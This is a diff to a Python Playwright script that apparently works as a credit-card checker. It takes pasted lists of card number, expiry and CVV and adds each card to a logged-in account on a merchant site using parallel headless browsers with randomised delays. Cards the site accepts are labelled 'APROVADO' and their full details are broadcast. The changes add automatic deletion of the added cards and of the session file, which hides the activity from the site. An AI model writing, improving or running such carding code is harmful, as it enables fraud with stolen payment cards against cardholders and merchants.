@@ -58,10 +58,10 @@ async def websocket_endpoint(websocket: WebSocket):
     except WebSocketDisconnect:
         estado["clients"].discard(websocket)
 
-# ===================== FUNÇÕES ORIGINAIS =====================
+# ===================== FUNÇÕES DE FAXINA =====================
 async def limpar_cartoes_antigos(page):
     try:
-        log("[Faxina] Iniciando limpeza...")
+        log("[Faxina] Iniciando limpeza de cartões antigos...")
         await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
         await asyncio.sleep(2)
 
@@ -69,8 +69,10 @@ async def limpar_cartoes_antigos(page):
         total = await botoes.count()
 
         if total == 0:
-            log("[Faxina] Nenhum cartão antigo.")
+            log("[Faxina] Nenhum cartão antigo encontrado.")
             return
+
+        log(f"[Faxina] {total} cartões encontrados. Removendo...")
 
         for _ in range(total * 3):
             if await botoes.count() == 0:
@@ -87,7 +89,7 @@ async def limpar_cartoes_antigos(page):
     except Exception as e:
         log(f"[Faxina] Erro: {e}")
 
-
+# ===================== LOGIN =====================
 async def login_mestre(playwright):
     try:
         log("[Autenticação] Iniciando login mestre...")
@@ -101,21 +103,25 @@ async def login_mestre(playwright):
         await page.get_by_role("button", name="Entrar").click()
 
         await page.wait_for_selector("text=Meus Cartões", timeout=30000)
+
+        # Faxina ANTES de começar os testes
+        await limpar_cartoes_antigos(page)
+
         await context.storage_state(path="sessao_unimar.json")
 
         await context.close()
         await browser.close()
-        log("[Autenticação] Login realizado com sucesso!")
+        log("[Autenticação] Login e faxina inicial concluídos!")
         return True
     except Exception as e:
         log(f"[ERRO] Login falhou: {e}")
         return False
 
-
-async def worker_contexto(id_worker: int, browser, fila: asyncio.Queue):
+# ===================== WORKER =====================
+async def worker_contexto(id_worker: int, browser, fila: asyncio.Queue, estado_fluxo: dict):
     try:
         await asyncio.sleep(id_worker * 2.5)
-        log(f"[Canal {id_worker}] Abrindo aba...")
+        log(f"[Canal {id_worker}] Iniciando...")
         context = await browser.new_context(storage_state="sessao_unimar.json")
         page = await context.new_page()
         await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
@@ -125,7 +131,7 @@ async def worker_contexto(id_worker: int, browser, fila: asyncio.Queue):
             indice, linha, tentativas = item
             try:
                 numero, mes, ano, cvv = [x.strip() for x in linha.split("|")]
-                log(f"[Canal {id_worker}][Item {indice}] Processando: {numero}")
+                log(f"[Canal {id_worker}][Item {indice}] Processando: {numero[-4:]}")
 
                 await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
                 await asyncio.sleep(random.uniform(1.0, 2.5))
@@ -146,6 +152,7 @@ async def worker_contexto(id_worker: int, browser, fila: asyncio.Queue):
                     if await page.get_by_role("button", name="Remover").count() > botoes_antes:
                         log(f"[Canal {id_worker}][Item {indice}] ✅ APROVADO")
                         await broadcast("aprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
+                        estado_fluxo["houve_aprovados"] = True
                         break
 
                     body = (await page.locator("body").inner_text()).lower()
@@ -160,7 +167,7 @@ async def worker_contexto(id_worker: int, browser, fila: asyncio.Queue):
     finally:
         await context.close()
 
-
+# ===================== PROCESSAMENTO PRINCIPAL =====================
 async def processar_cartoes(texto_cartoes: str, num_canais: int):
     try:
         linhas = [l.strip() for l in texto_cartoes.splitlines() if l.strip()]
@@ -174,19 +181,33 @@ async def processar_cartoes(texto_cartoes: str, num_canais: int):
             if not await login_mestre(pw):
                 return
 
+            estado_fluxo = {"houve_aprovados": False}
             browser = await pw.chromium.launch(headless=True, args=["--no-sandbox"])
-            tasks = [asyncio.create_task(worker_contexto(i, browser, fila)) for i in range(1, num_canais + 1)]
+
+            tasks = [asyncio.create_task(worker_contexto(i, browser, fila, estado_fluxo)) for i in range(1, num_canais + 1)]
             await asyncio.gather(*tasks, return_exceptions=True)
+
+            # Faxina FINAL se houver aprovados
+            if estado_fluxo["houve_aprovados"]:
+                log("[Sistema] Iniciando faxina final...")
+                try:
+                    faxina_context = await browser.new_context(storage_state="sessao_unimar.json")
+                    faxina_page = await faxina_context.new_page()
+                    await limpar_cartoes_antigos(faxina_page)
+                    await faxina_context.close()
+                except Exception as e:
+                    log(f"[Faxina Final] Erro: {e}")
 
             await browser.close()
 
     except Exception as e:
         log(f"[ERRO CRÍTICO] {e}")
     finally:
+        if os.path.exists("sessao_unimar.json"):
+            os.remove("sessao_unimar.json")
         estado["rodando"] = False
         await broadcast("status", {"rodando": False})
         log("[Sistema] Processamento finalizado.")
-
 
 # ===================== ROTAS =====================
 class IniciarRequest(BaseModel):
